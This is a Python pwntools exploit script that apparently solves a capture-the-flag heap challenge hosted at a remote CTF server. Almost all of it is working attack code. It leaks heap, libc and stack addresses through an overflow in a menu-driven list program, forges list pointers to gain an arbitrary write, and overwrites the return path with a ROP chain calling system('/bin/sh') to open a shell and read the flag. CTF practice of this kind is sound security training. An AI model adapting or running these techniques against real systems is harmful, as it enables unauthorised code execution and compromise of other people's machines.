#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '0.cloud.chals.io', 33257

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

breakrva 0x17ef
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec chall_patched 
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
#     RUNPATH:  b'.'

def add(content, priority):
    io.sendlineafter(b'vibe:', b'1')
    io.sendlineafter(b':', content)
    io.sendlineafter(b':', str(priority).encode())

def display():
    io.sendlineafter(b'vibe:', b'2')

def delete(id):
    io.sendlineafter(b'vibe:', b'3')
    io.sendlineafter(b':', str(id).encode())

def modify(id, content, priority):
    io.sendlineafter(b'vibe:', b'4')
    io.sendlineafter(b':', str(id).encode())
    io.sendafter(b':', content)
    io.sendlineafter(b':', str(priority).encode())

def exploit():
    global io
    io = initialize()

    add(b'AAAA', 0x0)
    add(b'B'*79+b'Z', 0x0)

    display()
    io.recvuntil(b'BZ')
    heap = u64(io.recvline().strip().ljust(8, b'\x00')) - 0x2a0

    add(b'CCCC', 0x0)
    add(b'DDDD', 0x0)
    add(b'EEEE', 0x0)
    add(b'FFFF', 0x0)
    add(b'GGGG', 0x0)
    add(b'HHHH', 0x0)
    add(b'IIII', 0x0)
    add(b'JJJJ', 0x0)
    add(b'KKKK', 0x0)
    add(b'LLLL', 0x0)
    add(b'MMMM', 0x0)
    add(b'NNNN', 0x0)
    add(b'OOOO', 0x0)
    add(b'PPPP', 0x0)
    add(b'QQQQ', 0x0)
    add(b'RRRR', 0x0)
    add(b'SSSS', 0x0)
    add(b'TTTT', 0x0)
    add(b'UUUU', 0x0)
    add(b'VVVV', 0x0)
    add(b'WWWW', 0x0)
    add(b'XXXX', 0x0)

    fake_head = b'\x00'*72 + p32(0x481) + b'\n'
    fake_next = b'\x00'*0x30 + p64(heap+0x5b0) + b'\n'
    modify(8, fake_head, 0x0)
    modify(9, fake_next, 0x0)
    modify(10, b'A'*79+b'B', 0x0)

    delete(0)
    display()

    io.recvuntil(b'AB')
    io.recvlines(10)
    io.recvuntil(b'Description: ')
    libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - 0x1e0c30
    io.recvlines(75) # cleanup

    fake_next = p64(libc.sym['environ']) + b'\n'
    modify(0xe, fake_next, 0x0)
    modify(0xf, b'A'*79+b'B', 0x0)

    display()
    io.recvuntil(b'AB\n')
    io.recvuntil(b'Description: ')
    io.recvuntil(b'Description: ')
    stack = u64(io.recvline().strip().ljust(8, b'\x00')) - 0x1e0c30

    target = stack + 0x1e0b28
    fake_next = b'\x00'*0x20 + p64(target) + p64(0x100) + b'\n'
    modify(0x10, fake_next, 0x0)
    modify(0x11, b'A'*79+b'B', 0x0)

    rop = ROP(libc)
    POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
    RET = rop.find_gadget(['ret'])[0]

    payload = flat([
        0x0,
        POP_RDI,
        next(libc.search(b'/bin/sh\x00')),
        RET,
        libc.sym['system'],
    ]) + b'\n'
    modify(0x0, payload, 0x0)

    io.sendlineafter(b'vibe:', b'5') # exit

    io.sendline(b'cat flag*')

    log.info('heap: %#x', heap)
    log.info('libc: %#x', libc.address)
    log.info('stack: %#x', stack)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
